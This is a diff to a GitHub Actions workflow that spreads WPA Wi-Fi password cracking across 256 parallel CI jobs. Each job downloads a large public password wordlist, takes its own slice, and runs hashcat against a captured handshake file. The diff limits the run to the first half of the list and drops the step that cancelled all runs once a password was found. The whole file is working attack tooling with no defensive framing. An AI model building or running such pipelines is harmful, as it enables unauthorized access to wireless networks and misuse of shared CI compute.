@@ -1,4 +1,4 @@
-name: full-dict-256
+name: full-dict-256-first-half
 
 on:
   workflow_dispatch:
@@ -9,8 +9,7 @@ jobs:
     strategy:
       max-parallel: 20
       matrix:
-        job_id: [
-          0,1,2,3,4,5,6,7,8,9,
+        job_id: [0,1,2,3,4,5,6,7,8,9,
           10,11,12,13,14,15,16,17,18,19,
           20,21,22,23,24,25,26,27,28,29,
           30,31,32,33,34,35,36,37,38,39,
@@ -30,8 +29,7 @@ jobs:
           220,221,222,223,224,225,226,227,228,229,
           230,231,232,233,234,235,236,237,238,239,
           240,241,242,243,244,245,246,247,248,249,
-          250,251,252,253,254,255
-        ]
+          250,251,252,253,254,255]
 
     steps:
       - name: Checkout repo
@@ -46,16 +44,16 @@ jobs:
         run: |
           wget -O all_in_one.txt.7z https://download.weakpass.com/wordlists/2088/all_in_one.txt.7z
 
-      - name: Extract this job's slice (streaming)
+      - name: Extract this job's slice (FIRST HALF)
         run: |
-          TOTAL_LINES=29630000000
+          TOTAL_LINES=$((29630000000 / 2))   # 前半部分
           JOBS=256
           LINES_PER_JOB=$(( (TOTAL_LINES + JOBS - 1) / JOBS ))
 
           START=$(( ${{ matrix.job_id }} * LINES_PER_JOB + 1 ))
           END=$(( (${{ matrix.job_id }} + 1) * LINES_PER_JOB ))
 
-          echo "Job ${{ matrix.job_id }} processing lines $START to $END"
+          echo "Job ${{ matrix.job_id }} processing FIRST HALF lines $START to $END"
 
           7z x all_in_one.txt.7z -so | \
             awk -v s=$START -v e=$END 'NR>=s && NR<=e' > dict.txt
@@ -63,13 +61,10 @@ jobs:
       - name: Delete dictionary archive after slicing
         run: |
           if [ -s dict.txt ]; then
-            echo "Slice OK → deleting archive"
             rm -f all_in_one.txt.7z
-          else
-            echo "Slice failed → keeping archive"
           fi
 
-      - name: Run hashcat (monitor stdout only)
+      - name: Run hashcat
         run: |
           hashcat -m 22000 -a 0 -w 3 --status \
             hs/wifi-01.hc22000 dict.txt -o result.txt | tee hashcat_status.txt
@@ -90,13 +85,6 @@ jobs:
           name: cracked_result
           path: result.txt
 
-      - name: Stop all jobs if cracked
-        if: steps.check.outputs.found == 'true'
-        run: |
-          echo "Password found. Stopping all jobs."
-          gh run cancel --repo $GITHUB_REPOSITORY $(gh run list --limit 100 --json databaseId -q '.[].databaseId')
-
       - name: Cleanup
         run: |
-          rm -f dict.txt || true
-          rm -f hashcat_status.txt || true
+          rm -f dict.txt hashcat_status.txt || true
